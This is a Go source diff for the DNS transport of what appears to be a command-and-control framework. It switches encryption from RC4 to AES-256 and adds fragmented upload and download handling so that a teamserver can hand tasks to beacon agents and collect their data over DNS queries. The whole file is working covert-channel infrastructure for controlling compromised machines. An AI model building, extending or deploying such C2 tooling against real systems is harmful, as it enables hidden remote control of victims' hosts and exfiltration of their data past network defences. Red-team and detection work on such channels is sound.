@@ -4,7 +4,8 @@ import (
 	"bytes"
 	"compress/zlib"
 	"context"
-	"crypto/rc4"
+	"crypto/aes"
+	"crypto/cipher"
 	"encoding/base32"
 	"encoding/base64"
 	"encoding/binary"
@@ -17,6 +18,7 @@ import (
 	"regexp"
 	"strconv"
 	"strings"
+	"sync"
 	"time"
 
 	"github.com/miekg/dns"
@@ -33,8 +35,15 @@ type TransportDNS struct {
 
 	udpServer *dns.Server
 	tcpServer *dns.Server
+	//ts        Teamserver
 
-	rng *mrand.Rand
+	mu             sync.Mutex
+	upFrags        map[string]*dnsFragBuf
+	downFrags      map[string]*dnsDownBuf
+	upDoneCache    map[string]*dnsUpDone
+	localInflights map[string]*localInflight
+	needsReset     map[string]bool
+	rng            *mrand.Rand
 }
 
 type TransportConfig struct { // DNSConfig
@@ -68,9 +77,8 @@ func validConfig(config string) error {
 		return errors.New("domain is required")
 	}
 
-	keyLen := len(conf.EncryptKey)
-	if keyLen < 6 || keyLen > 32 {
-		return errors.New("encrypt_key must be 6-32 characters")
+	if len(conf.EncryptKey) != 64 {
+		return errors.New("encrypt_key must be 64 hex characters (32 bytes for AES-256)")
 	}
 
 	return nil
@@ -105,12 +113,15 @@ func (t *TransportDNS) Start(ts Teamserver) error {
 		}
 	}()
 
+	go t.cleanupLoop()
+
 	time.Sleep(500 * time.Millisecond)
 
 	return start_error
 }
 
 func (t *TransportDNS) Stop() error {
+
 	t.Active = false
 
 	ctx, cancel := context.WithTimeout(context.Background(), shutdownTimeout)
@@ -252,17 +263,27 @@ func (t *TransportDNS) handleHI(req *dnsRequest, w dns.ResponseWriter) {
 	}
 
 	keyBytes, err := hex.DecodeString(t.Config.EncryptKey)
-	if err != nil || len(keyBytes) != 16 {
+	if err != nil || len(keyBytes) != 32 {
 		return
 	}
 
-	cipher, err := rc4.NewCipher(keyBytes)
+	block, err := aes.NewCipher(keyBytes)
 	if err != nil {
 		return
 	}
-
-	fullBeat := make([]byte, len(req.data))
-	cipher.XORKeyStream(fullBeat, req.data)
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		return
+	}
+	nonceSize := gcm.NonceSize()
+	if len(req.data) < nonceSize+gcm.Overhead() {
+		return
+	}
+	nonce, ciphertext := req.data[:nonceSize], req.data[nonceSize:]
+	fullBeat, err := gcm.Open(nil, nonce, ciphertext, nil)
+	if err != nil {
+		return
+	}
 
 	if len(fullBeat) < 8 {
 		return
@@ -279,76 +300,20 @@ func (t *TransportDNS) handleHI(req *dnsRequest, w dns.ResponseWriter) {
 	_ = Ts.TsAgentSetTick(agentId, t.Name)
 }
 
-const beaconFrameHeaderSize = 9
-const beaconCompressMinSize = 2048
-
-func beaconEncodeDownstream(data []byte) []byte {
-	payload, flags := beaconCompress(data)
-	nonce := uint32(time.Now().UnixNano()&0xFFFFFFFF) ^ mrand.Uint32()
-
-	frame := make([]byte, beaconFrameHeaderSize+len(payload))
-	frame[0] = flags
-	binary.LittleEndian.PutUint32(frame[1:5], nonce)
-	binary.LittleEndian.PutUint32(frame[5:9], uint32(len(data)))
-	copy(frame[beaconFrameHeaderSize:], payload)
-	return frame
-}
-
-func beaconDecodeUpstream(data []byte) []byte {
-	if len(data) <= 5 {
-		return data
-	}
-	flags := data[0]
-	origLen := binary.LittleEndian.Uint32(data[1:5])
-	payload := data[5:]
-
-	if (flags & 0x1) != 0 {
-		if origLen > 0 {
-			zr, err := zlib.NewReader(bytes.NewReader(payload))
-			if err == nil {
-				decompressed := make([]byte, origLen)
-				n, errRead := zr.Read(decompressed)
-				zr.Close()
-				if errRead == nil || (n > 0 && n == int(origLen)) {
-					return decompressed[:n]
-				}
-			}
-		}
-	} else if origLen > 0 && origLen <= uint32(len(payload)) {
-		return payload[:origLen]
-	}
-	return data
-}
-
-func beaconCompress(data []byte) ([]byte, byte) {
-	if uint32(len(data)) <= beaconCompressMinSize {
-		return data, 0
-	}
-	var zbuf bytes.Buffer
-	wz, err := zlib.NewWriterLevel(&zbuf, zlib.BestCompression)
-	if err != nil {
-		return data, 0
-	}
-	if _, err := wz.Write(data); err != nil {
-		wz.Close()
-		return data, 0
-	}
-	if err := wz.Close(); err != nil {
-		return data, 0
-	}
-	compressed := zbuf.Bytes()
-	if len(compressed) > 0 && len(compressed) < len(data) {
-		return compressed, 1
-	}
-	return data, 0
-}
-
 func (t *TransportDNS) handleHB(req *dnsRequest) (needsReset bool, hasPendingTasks bool) {
 	if req.sid != "" {
 		_ = Ts.TsAgentSetTick(req.sid, t.Name)
 	}
 
-	decrypted := rc4Crypt(req.data, t.Config.EncryptKey)
+	// Check if this SID needs reset
+	t.mu.Lock()
+	if t.needsReset[req.sid] {
+		needsReset = true
+		delete(t.needsReset, req.sid)
+	}
+	t.mu.Unlock()
+
+	decrypted := aes256CTRStream(req.data, t.Config.EncryptKey)
 
 	var ackOffset, ackTaskNonce uint32
 	if len(decrypted) >= 4 {
@@ -357,12 +322,31 @@ func (t *TransportDNS) handleHB(req *dnsRequest) (needsReset bool, hasPendingTas
 	if len(decrypted) >= 12 {
 		ackTaskNonce = binary.BigEndian.Uint32(decrypted[8:12])
 	}
-	if ackOffset > 0 || ackTaskNonce > 0 {
-		Ts.TsFrameAckDelivery(req.sid, ackOffset, ackTaskNonce)
-	}
 
-	hasPendingTasks = Ts.TsFrameHasPending(req.sid)
-	return false, hasPendingTasks
+	t.mu.Lock()
+	df, hasDf := t.downFrags[req.sid]
+	if hasDf && df != nil {
+		df.lastUpdate = time.Now()
+		if df.total > 0 && ackOffset >= df.total && ackTaskNonce == df.taskNonce {
+			delete(t.localInflights, req.sid)
+			delete(t.downFrags, req.sid)
+			df = nil
+			hasDf = false
+		}
+	}
+	t.mu.Unlock()
+
+	if !hasDf || df == nil {
+		taskData, taskNonce := t.fetchOrRetryTasks(req.sid)
+		if len(taskData) > 0 {
+			t.mu.Lock()
+			t.downFrags[req.sid] = newDownBuf(taskData, taskNonce)
+			t.mu.Unlock()
+			hasPendingTasks = true
+		}
+	} else {
+		hasPendingTasks = true
+	}
 
 	return needsReset, hasPendingTasks
 }
@@ -372,14 +356,223 @@ func (t *TransportDNS) handleGET(req *dnsRequest, w dns.ResponseWriter) []byte {
 		_ = Ts.TsAgentSetTick(req.sid, t.Name)
 	}
 
-	decrypted := rc4Crypt(req.data, t.Config.EncryptKey)
+	decrypted := aes256CTRStream(req.data, t.Config.EncryptKey)
 
 	var reqOffset uint32
 	if len(decrypted) >= 4 {
 		reqOffset = binary.BigEndian.Uint32(decrypted[0:4])
 	}
 
+	t.mu.Lock()
+	df, exists := t.downFrags[req.sid]
+	if exists && df != nil {
+		df.lastUpdate = time.Now()
+		if reqOffset > 0 && reqOffset <= df.total && reqOffset > df.off {
+			df.off = reqOffset
+		}
+	}
+	t.mu.Unlock()
+
+	if df == nil || df.off >= df.total {
+		if df != nil && df.off >= df.total {
+			t.mu.Lock()
+			delete(t.downFrags, req.sid)
+			t.mu.Unlock()
+			df = nil
+		}
+
+		taskData, taskNonce := t.fetchOrRetryTasks(req.sid)
+		if len(taskData) > 0 {
+			df = newDownBuf(taskData, taskNonce)
+			t.mu.Lock()
+			t.downFrags[req.sid] = df
+			t.mu.Unlock()
+		}
+	}
+
 	isTCP := w.RemoteAddr().Network() == "tcp"
+	return t.buildResponseChunk(df, reqOffset, isTCP)
+}
+
+func (t *TransportDNS) handlePUT(req *dnsRequest) putAckInfo {
+	ack := putAckInfo{}
+
+	if len(req.data) == 0 {
+		return ack
+	}
+
+	t.mu.Lock()
+	if t.needsReset[req.sid] {
+		ack.needsReset = true
+		delete(t.needsReset, req.sid)
+	}
+	t.mu.Unlock()
+
+	decrypted := aes256CTRStream(req.data, t.Config.EncryptKey)
+	ack = t.handlePutFragment(req.sid, req.seq, decrypted, ack)
+
+	if req.sid != "" {
+		_ = Ts.TsAgentSetTick(req.sid, t.Name)
+	}
+	return ack
+}
+
+func (t *TransportDNS) handlePutFragment(sid string, seq int, data []byte, ack putAckInfo) putAckInfo {
+	_ = seq
+
+	if sid == "" {
+		return ack
+	}
+
+	if len(data) == 0 || len(data) <= 8 {
+		_ = Ts.TsAgentProcessData(sid, data)
+		return ack
+	}
+
+	var total, offset uint32
+	var chunk []byte
+
+	meta, rest, hasMeta := parseMetaV1(data)
+	if hasMeta {
+		if (meta.MetaFlags & 0x1) != 0 {
+			t.mu.Lock()
+			df, hasDf := t.downFrags[sid]
+			var ackTaskNonce uint32
+			shouldAck := false
+			if hasDf && df != nil {
+				ackTaskNonce = df.taskNonce
+				if df.total > 0 && meta.DownAckOffset == df.total {
+					shouldAck = true
+				}
+			}
+			t.mu.Unlock()
+
+			if shouldAck {
+				t.mu.Lock()
+				delete(t.localInflights, sid)
+				if cur, ok := t.downFrags[sid]; ok && cur != nil && cur.taskNonce == ackTaskNonce {
+					delete(t.downFrags, sid)
+				}
+				t.mu.Unlock()
+			}
+		}
+
+		if len(rest) <= 8 {
+			_ = Ts.TsAgentProcessData(sid, rest)
+			return ack
+		}
+		total = binary.BigEndian.Uint32(rest[0:4])
+		offset = binary.BigEndian.Uint32(rest[4:8])
+		chunk = rest[8:]
+	} else {
+		total = binary.BigEndian.Uint32(data[0:4])
+		offset = binary.BigEndian.Uint32(data[4:8])
+		chunk = data[8:]
+	}
+
+	if total == 0 || total > maxUploadSize {
+		_ = Ts.TsAgentProcessData(sid, data)
+		return ack
+	}
+
+	// Populate ack info with totals
+	ack.total = total
+
+	if offset == 0 && total <= uint32(len(chunk)) {
+		_ = Ts.TsAgentProcessData(sid, decompressUpstream(chunk))
+		ack.complete = true
+		ack.filled = total
+		ack.lastReceivedOff = 0
+		ack.nextExpectedOff = total
+		return ack
+	}
+
+	t.mu.Lock()
+
+	if done, exists := t.upDoneCache[sid]; exists && done.total == total {
+		ack.complete = true
+		ack.filled = done.total
+		ack.lastReceivedOff = done.total
+		ack.nextExpectedOff = done.total
+		t.mu.Unlock()
+		return ack
+	}
+
+	fb, ok := t.upFrags[sid]
+	if !ok || fb.total != total || (offset == 0 && fb.highWater > 0) {
+		fb = newFragBuf(total)
+		t.upFrags[sid] = fb
+	}
+
+	// Track chunk size for gap detection
+	chunkLen := uint32(len(chunk))
+	if fb.chunkSize == 0 && chunkLen > 0 {
+		fb.chunkSize = chunkLen
+	}
+
+	// Check for duplicate or out-of-bounds offset
+	if offset >= fb.total || fb.seenOffsets[offset] {
+		// Return current state even for duplicates
+		ack.lastReceivedOff = fb.lastReceivedOff
+		ack.nextExpectedOff = t.computeNextExpectedOffset(fb)
+		ack.filled = fb.filled
+		t.mu.Unlock()
+		return ack
+	}
+
+	end := offset + chunkLen
+	if end > fb.total {
+		end = fb.total
+	}
+	n := end - offset
+	copy(fb.buf[offset:end], chunk[:n])
+
+	fb.seenOffsets[offset] = true
+	fb.filled += n
+	fb.lastReceivedOff = offset
+	fb.expectedOff = end
+	fb.lastUpdate = time.Now()
+
+	if end > fb.highWater {
+		fb.highWater = end
+	}
+
+	// Compute next expected offset based on gaps
+	fb.nextExpectedOff = t.computeNextExpectedOffset(fb)
+
+	// Update ack info
+	ack.lastReceivedOff = fb.lastReceivedOff
+	ack.nextExpectedOff = fb.nextExpectedOff
+	ack.filled = fb.filled
+
+	var completeBuf []byte
+	if fb.filled >= fb.total {
+		completeBuf = make([]byte, len(fb.buf))
+		copy(completeBuf, fb.buf)
+		t.upDoneCache[sid] = newUpDone(fb.total)
+		delete(t.upFrags, sid)
+		ack.complete = true
+	}
+	t.mu.Unlock()
+
+	// Process data outside of lock to avoid blocking other goroutines
+	if completeBuf != nil {
+		_ = Ts.TsAgentProcessData(sid, decompressUpstream(completeBuf))
+	}
+
+	return ack
+}
+
+/// RESPONSE
+
+func (t *TransportDNS) buildResponseChunk(df *dnsDownBuf, reqOffset uint32, isTCP bool) []byte {
+	if df == nil || df.total == 0 {
+		return nil
+	}
+
+	if reqOffset >= df.total {
+		reqOffset = 0
+	}
 
 	maxChunk := t.Config.PktSize
 	if !isTCP {
@@ -392,70 +585,17 @@ func (t *TransportDNS) handleGET(req *dnsRequest, w dns.ResponseWriter) []byte {
 		}
 	}
 
-	total, offset, data, _, isEmpty := Ts.TsFrameGetChunk(req.sid, reqOffset, maxChunk, beaconEncodeDownstream)
-	if isEmpty || len(data) == 0 {
-		return nil
+	remaining := df.total - reqOffset
+	chunkLen := remaining
+	if chunkLen > uint32(maxChunk) {
+		chunkLen = uint32(maxChunk)
 	}
 
-	frame := make([]byte, 8+len(data))
-	binary.BigEndian.PutUint32(frame[0:4], total)
-	binary.BigEndian.PutUint32(frame[4:8], offset)
-	copy(frame[8:], data)
+	frame := make([]byte, 8+chunkLen)
+	binary.BigEndian.PutUint32(frame[0:4], df.total)
+	binary.BigEndian.PutUint32(frame[4:8], reqOffset)
+	copy(frame[8:], df.buf[reqOffset:reqOffset+chunkLen])
 	return frame
-}
-
-func (t *TransportDNS) handlePUT(req *dnsRequest) putAckInfo {
-	ack := putAckInfo{}
-
-	if len(req.data) == 0 {
-		return ack
-	}
-
-	decrypted := rc4Crypt(req.data, t.Config.EncryptKey)
-
-	// Parse optional MetaV1 header (may contain downstream delivery ACK)
-	payload := decrypted
-	meta, rest, hasMeta := parseMetaV1(decrypted)
-	if hasMeta {
-		if (meta.MetaFlags & 0x1) != 0 {
-			Ts.TsFrameAckDelivery(req.sid, meta.DownAckOffset, 0)
-		}
-		payload = rest
-	}
-
-	// Tiny payload without fragmentation header — pass through directly
-	if len(payload) <= 8 {
-		_ = Ts.TsAgentProcessData(req.sid, payload)
-		return ack
-	}
-
-	// Parse fragment header: [total:4][offset:4][chunk...]
-	total := binary.BigEndian.Uint32(payload[0:4])
-	offset := binary.BigEndian.Uint32(payload[4:8])
-	chunk := payload[8:]
-
-	if total == 0 {
-		_ = Ts.TsAgentProcessData(req.sid, payload)
-		return ack
-	}
-
-	// Delegate to FrameManager (byte-offset mode: totalSize > 0, chunkCount = 0)
-	complete, nextExpectedOff, filled, _, assembled := Ts.TsFramePut(req.sid, offset, chunk, total, 0)
-
-	if complete && assembled != nil {
-		decoded := beaconDecodeUpstream(assembled)
-		_ = Ts.TsAgentProcessData(req.sid, decoded)
-	}
-
-	ack.total = total
-	ack.complete = complete
-	ack.nextExpectedOff = nextExpectedOff
-	ack.filled = filled
-
-	if req.sid != "" {
-		_ = Ts.TsAgentSetTick(req.sid, t.Name)
-	}
-	return ack
 }
 
 func (t *TransportDNS) buildAckResponse(req *dnsRequest, ttl uint32) dns.RR {
@@ -486,7 +626,11 @@ func (t *TransportDNS) buildPutAckResponse(req *dnsRequest, ack putAckInfo, ttl 
 		if ack.complete {
 			flags |= 0x01
 		}
+		if ack.needsReset {
+			flags |= 0x02
+		}
 		ip[0] = flags
+		// Encode nextExpectedOff as 24-bit big-endian (up to 16MB)
 		ip[1] = byte((ack.nextExpectedOff >> 16) & 0xFF)
 		ip[2] = byte((ack.nextExpectedOff >> 8) & 0xFF)
 		ip[3] = byte(ack.nextExpectedOff & 0xFF)
@@ -495,16 +639,22 @@ func (t *TransportDNS) buildPutAckResponse(req *dnsRequest, ack putAckInfo, ttl 
 			A:   ip,
 		}
 	case dns.TypeAAAA:
+		// For AAAA, use first 8 bytes for extended info
 		ip := make(net.IP, 16)
 		var flags byte
 		if ack.complete {
 			flags |= 0x01
 		}
+		if ack.needsReset {
+			flags |= 0x02
+		}
 		ip[0] = flags
+		// nextExpectedOff (4 bytes)
 		ip[1] = byte((ack.nextExpectedOff >> 24) & 0xFF)
 		ip[2] = byte((ack.nextExpectedOff >> 16) & 0xFF)
 		ip[3] = byte((ack.nextExpectedOff >> 8) & 0xFF)
 		ip[4] = byte(ack.nextExpectedOff & 0xFF)
+		// filled (4 bytes)
 		ip[5] = byte((ack.filled >> 24) & 0xFF)
 		ip[6] = byte((ack.filled >> 16) & 0xFF)
 		ip[7] = byte((ack.filled >> 8) & 0xFF)
@@ -570,7 +720,7 @@ func (t *TransportDNS) buildDataResponse(req *dnsRequest, frame []byte, ttl uint
 		}
 	}
 
-	encrypted := rc4Crypt(frame, t.Config.EncryptKey)
+	encrypted := aes256CTRStream(frame, t.Config.EncryptKey)
 	b64Str := base64.StdEncoding.EncodeToString(encrypted)
 
 	var chunks []string
@@ -586,17 +736,173 @@ func (t *TransportDNS) buildDataResponse(req *dnsRequest, frame []byte, ttl uint
 	}
 }
 
+// Task Fetching (unified for GET and HB)
+func (t *TransportDNS) fetchOrRetryTasks(sid string) ([]byte, uint32) {
+	t.mu.Lock()
+	existingInflight, hasInflight := t.localInflights[sid]
+	t.mu.Unlock()
+
+	if hasInflight && existingInflight != nil {
+		existingInflight.attempts++
+		return existingInflight.data, existingInflight.nonce
+	}
+
+	maxDataSize := t.Config.PktSize * 256
+	if maxDataSize <= 0 || maxDataSize > maxDownloadSize {
+		maxDataSize = maxDownloadSize
+	}
+
+	p, err := Ts.TsAgentGetHostedAll(sid, maxDataSize)
+	if err != nil || len(p) == 0 {
+		return nil, 0
+	}
+
+	taskNonce := uint32(time.Now().UnixNano()&0xFFFFFFFF) ^ t.rng.Uint32()
+	origLen := len(p)
+	payload, flags := compressPayload(p)
+	taskData := buildTaskFrame(payload, taskNonce, flags, origLen)
+
+	t.mu.Lock()
+	t.localInflights[sid] = newInflight(taskData, taskNonce)
+	t.mu.Unlock()
+
+	return taskData, taskNonce
+}
+
+func (t *TransportDNS) ackDelivery(sid string, ackTaskNonce uint32) {
+	t.mu.Lock()
+	defer t.mu.Unlock()
+
+	df, hasDf := t.downFrags[sid]
+	if !hasDf || df == nil {
+		return
+	}
+
+	if ackTaskNonce == df.taskNonce {
+		delete(t.localInflights, sid)
+		delete(t.downFrags, sid)
+	}
+}
+
+// computeNextExpectedOffset finds the next missing offset based on chunk size
+func (t *TransportDNS) computeNextExpectedOffset(fb *dnsFragBuf) uint32 {
+	if fb.chunkSize == 0 {
+		return fb.highWater
+	}
+
+	// Scan from start to find first gap
+	for off := uint32(0); off < fb.total; off += fb.chunkSize {
+		if !fb.seenOffsets[off] {
+			return off
+		}
+	}
+	return fb.total
+}
+
+/// CLEANUP
+
+func (t *TransportDNS) cleanupLoop() {
+	ticker := time.NewTicker(cleanupInterval)
+	defer ticker.Stop()
+
+	for t.Active {
+		select {
+		case <-ticker.C:
+			t.cleanupStaleEntries()
+		}
+	}
+}
+
+func (t *TransportDNS) cleanupStaleEntries() {
+	now := time.Now()
+
+	t.mu.Lock()
+	defer t.mu.Unlock()
+
+	// Cleanup stale upload fragments
+	for sid, fb := range t.upFrags {
+		if now.Sub(fb.lastUpdate) > staleTimeout {
+			delete(t.upFrags, sid)
+		}
+	}
+
+	// Cleanup stale download buffers
+	for sid, db := range t.downFrags {
+		if now.Sub(db.lastUpdate) > downTimeout {
+			delete(t.downFrags, sid)
+		}
+	}
+
+	// Cleanup expired dedup cache
+	for sid, done := range t.upDoneCache {
+		if now.Sub(done.doneAt) > dedupTimeout {
+			delete(t.upDoneCache, sid)
+		}
+	}
+
+	// Cleanup stale inflights
+	for sid, inf := range t.localInflights {
+		if now.Sub(inf.createdAt) > inflightTimeout || inf.attempts > maxInflightAttempts {
+			delete(t.localInflights, sid)
+		}
+	}
+}
+
 /// UTILS
 
+// Constants
 const (
 	seqXorMask       = 0x39913991
+	maxUploadSize    = 4 << 20 // 4 MB
+	maxDownloadSize  = 4 << 20 // 4 MB
+	minCompressSize  = 2048
 	dnsSafeChunkSize = 280
 	defaultChunkSize = 4096
 	metaV1Size       = 8
 	frameHeaderSize  = 9 // flags:1 + nonce:4 + origLen:4
 
-	shutdownTimeout = 2 * time.Second
+	staleTimeout        = 5 * time.Minute
+	dedupTimeout        = 5 * time.Minute
+	downTimeout         = 10 * time.Minute
+	inflightTimeout     = 5 * time.Minute
+	maxInflightAttempts = 10
+	cleanupInterval     = 60 * time.Second
+	shutdownTimeout     = 2 * time.Second
 )
+
+// Types
+type dnsFragBuf struct {
+	total           uint32
+	buf             []byte
+	filled          uint32
+	highWater       uint32
+	expectedOff     uint32
+	lastUpdate      time.Time
+	seenOffsets     map[uint32]bool
+	lastReceivedOff uint32
+	nextExpectedOff uint32
+	chunkSize       uint32
+}
+
+type dnsDownBuf struct {
+	total      uint32
+	off        uint32
+	buf        []byte
+	taskNonce  uint32
+	lastUpdate time.Time
+}
+
+type dnsUpDone struct {
+	total  uint32
+	doneAt time.Time
+}
+
+type localInflight struct {
+	data      []byte
+	nonce     uint32
+	createdAt time.Time
+	attempts  int
+}
 
 type metaV1 struct {
 	Version       byte
@@ -615,26 +921,70 @@ type dnsRequest struct {
 }
 
 type putAckInfo struct {
+	lastReceivedOff uint32
 	nextExpectedOff uint32
 	total           uint32
 	filled          uint32
+	needsReset      bool
 	complete        bool
 }
 
-func rc4Crypt(data []byte, keyHex string) []byte {
+// Constructors
+func newFragBuf(total uint32) *dnsFragBuf {
+	fb := new(dnsFragBuf)
+	fb.total = total
+	fb.buf = make([]byte, total)
+	fb.lastUpdate = time.Now()
+	fb.seenOffsets = make(map[uint32]bool)
+	fb.lastReceivedOff = 0
+	fb.nextExpectedOff = 0
+	fb.chunkSize = 0
+	return fb
+}
+
+func newDownBuf(data []byte, nonce uint32) *dnsDownBuf {
+	db := new(dnsDownBuf)
+	db.total = uint32(len(data))
+	db.buf = data
+	db.taskNonce = nonce
+	db.lastUpdate = time.Now()
+	return db
+}
+
+func newInflight(data []byte, nonce uint32) *localInflight {
+	inf := new(localInflight)
+	inf.data = data
+	inf.nonce = nonce
+	inf.createdAt = time.Now()
+	inf.attempts = 1
+	return inf
+}
+
+func newUpDone(total uint32) *dnsUpDone {
+	ud := new(dnsUpDone)
+	ud.total = total
+	ud.doneAt = time.Now()
+	return ud
+}
+
+// AES-256-CTR stream cipher matching C++ CryptAES256Stream
+func aes256CTRStream(data []byte, keyHex string) []byte {
 	if len(data) == 0 {
 		return data
 	}
 	keyBytes, err := hex.DecodeString(keyHex)
-	if err != nil || len(keyBytes) != 16 {
+	if err != nil || len(keyBytes) != 32 {
 		return data
 	}
-	cipher, err := rc4.NewCipher(keyBytes)
+	block, err := aes.NewCipher(keyBytes)
 	if err != nil {
 		return data
 	}
+	ctr := make([]byte, aes.BlockSize)
+	ctr[15] = 1
+	stream := cipher.NewCTR(block, ctr)
 	result := make([]byte, len(data))
-	cipher.XORKeyStream(result, data)
+	stream.XORKeyStream(result, data)
 	return result
 }
 
@@ -648,4 +998,67 @@ func parseMetaV1(data []byte) (metaV1, []byte, bool) {
 	m.Reserved = binary.LittleEndian.Uint16(data[2:4])
 	m.DownAckOffset = binary.LittleEndian.Uint32(data[4:8])
 	return m, data[metaV1Size:], true
+}
+
+func compressPayload(data []byte) (payload []byte, flags byte) {
+	if len(data) <= minCompressSize {
+		return data, 0
+	}
+
+	var zbuf bytes.Buffer
+	wz, err := zlib.NewWriterLevel(&zbuf, zlib.BestCompression)
+	if err != nil {
+		return data, 0
+	}
+
+	if _, err := wz.Write(data); err != nil {
+		wz.Close()
+		return data, 0
+	}
+
+	if err := wz.Close(); err != nil {
+		return data, 0
+	}
+
+	compressed := zbuf.Bytes()
+	if len(compressed) > 0 && len(compressed) < len(data) {
+		return compressed, 1
+	}
+	return data, 0
+}
+
+func decompressUpstream(data []byte) []byte {
+	if len(data) <= 5 {
+		return data
+	}
+
+	flags := data[0]
+	origLen := binary.LittleEndian.Uint32(data[1:5])
+	payload := data[5:]
+
+	if (flags & 0x1) != 0 {
+		if origLen > 0 && origLen <= maxUploadSize {
+			zr, err := zlib.NewReader(bytes.NewReader(payload))
+			if err == nil {
+				decompressed := make([]byte, origLen)
+				n, errRead := zr.Read(decompressed)
+				zr.Close()
+				if errRead == nil || (n > 0 && n == int(origLen)) {
+					return decompressed[:n]
+				}
+			}
+		}
+	} else if origLen > 0 && origLen <= uint32(len(payload)) {
+		return payload[:origLen]
+	}
+	return data
+}
+
+func buildTaskFrame(payload []byte, nonce uint32, flags byte, origLen int) []byte {
+	frame := make([]byte, frameHeaderSize+len(payload))
+	frame[0] = flags
+	binary.LittleEndian.PutUint32(frame[1:5], nonce)
+	binary.LittleEndian.PutUint32(frame[5:9], uint32(origLen))
+	copy(frame[frameHeaderSize:], payload)
+	return frame
 }
